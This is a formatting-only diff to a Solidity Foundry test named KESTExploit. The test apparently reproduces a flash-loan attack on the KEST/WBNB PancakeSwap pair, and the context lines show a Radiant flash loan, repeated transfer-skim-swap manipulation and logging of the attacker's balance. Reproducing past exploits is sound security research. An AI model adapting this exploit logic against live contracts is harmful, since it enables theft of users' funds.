@@ -39,9 +39,7 @@ contract KESTExploit is BaseTestWithBalanceLog {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         address[] memory assets = new address[](1);
@@ -53,9 +51,7 @@ contract KESTExploit is BaseTestWithBalanceLog {
         Radiant.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
@@ -71,7 +67,7 @@ contract KESTExploit is BaseTestWithBalanceLog {
         KEST_WBNB.approve(address(PancakeRouter), type(uint256).max);
 
         WBNBToKEST(1e16);
-        (uint112 reserveKEST, uint112 reserveWBNB, ) = KEST_WBNB.getReserves();
+        (uint112 reserveKEST, uint112 reserveWBNB,) = KEST_WBNB.getReserves();
         uint256 amountWBNBtoTransfer = PancakeRouter.quote(KEST.balanceOf(address(this)), reserveKEST, reserveWBNB);
         WBNB.transfer(address(KEST_WBNB), amountWBNBtoTransfer);
         KEST.transfer(address(KEST_WBNB), KEST.balanceOf(address(this)));
@@ -83,7 +79,7 @@ contract KESTExploit is BaseTestWithBalanceLog {
             uint256 cachedKESTBalance = KEST.balanceOf(address(this));
             KEST.transfer(address(KEST_WBNB), cachedKESTBalance);
             KEST_WBNB.skim(address(KEST_WBNB));
-            (reserveKEST, reserveWBNB, ) = KEST_WBNB.getReserves();
+            (reserveKEST, reserveWBNB,) = KEST_WBNB.getReserves();
             uint256 amountIn = KEST.balanceOf(address(KEST_WBNB)) - reserveKEST;
             uint256 amountOut = PancakeRouter.getAmountOut(amountIn, reserveKEST, reserveWBNB);
             KEST_WBNB.swap(0, amountOut, address(this), bytes(""));
@@ -93,20 +89,11 @@ contract KESTExploit is BaseTestWithBalanceLog {
             path[0] = address(WBNB);
             path[1] = address(KEST);
             PancakeRouter.swapTokensForExactTokens(
-                amountOut,
-                WBNB.balanceOf(address(this)),
-                path,
-                address(PancakeRouter),
-                block.timestamp + 1_000
+                amountOut, WBNB.balanceOf(address(this)), path, address(PancakeRouter), block.timestamp + 1000
             );
 
             PancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
-                address(KEST),
-                1e15,
-                1,
-                1,
-                address(this),
-                block.timestamp + 1_000
+                address(KEST), 1e15, 1, 1, address(this), block.timestamp + 1000
             );
             KESTToWBNB();
             ++i;
@@ -117,16 +104,14 @@ contract KESTExploit is BaseTestWithBalanceLog {
 
     receive() external payable {}
 
-    function WBNBToKEST(uint256 amount) private {
+    function WBNBToKEST(
+        uint256 amount
+    ) private {
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(KEST);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            1,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            amount, 1, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -135,11 +120,7 @@ contract KESTExploit is BaseTestWithBalanceLog {
         path[0] = address(KEST);
         path[1] = address(WBNB);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            KEST.balanceOf(address(this)),
-            1,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            KEST.balanceOf(address(this)), 1, path, address(this), block.timestamp + 1000
         );
     }
 }
